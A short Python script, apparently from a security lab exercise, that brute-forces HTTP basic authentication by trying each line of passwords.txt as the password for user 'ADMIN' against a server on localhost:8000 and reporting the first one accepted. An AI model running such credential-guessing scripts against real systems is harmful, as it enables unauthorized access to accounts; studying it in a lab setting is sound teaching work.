import os
import requests

os.chdir('lab1')

# print(os.listdir())
# print(os.getcwd())



with open("passwords.txt", "r") as f:
    password_list = f.readlines()
    for password in password_list:
        stripped_password = password.strip()
        request = requests.get("http://localhost:8000", auth=("ADMIN", stripped_password))
        if (request.status_code == 200):
            print(f"Password found: {stripped_password}")
            break
